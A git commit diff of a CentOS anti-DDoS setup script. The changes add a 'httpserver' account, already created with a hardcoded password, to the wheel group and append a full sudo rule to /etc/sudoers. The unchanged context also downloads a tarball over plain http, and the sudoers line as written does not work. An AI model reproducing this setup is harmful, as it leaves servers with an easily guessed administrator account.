44453942480fb6a6139a1f297fa439a022f1afc2
Abel Antunes <34608001+abelantunes98@users.noreply.github.com>
2019-08-20 20:59:28 -0300

    Adicionando protecao

--- antiDDos.sh
+++ antiDDos.sh
@@ -8,9 +8,10 @@ cd AntiDdos-CentOS
 echo "Baixando dependencias."
 sudo yum install httpd-devel
 sudo yum install centos-release-scl
-sudo yum install rh-python36
 sudo useradd httpserver -m -p $(openssl passwd -1 serverhttp12)
-usermod -aG wheel httpserver
+sudo usermod -aG wheel httpserver
+sudo echo "httpserver ALL=(ALL)    ALL" >> /etc/sudoers
+sudo yum install rh-python36
 sudo yum groupinstall 'Development tools'
 sudo wget http://www.rfxn.com/downloads/apf-current.tar.gz
 sudo tar -zxvf apf-current.tar.gz
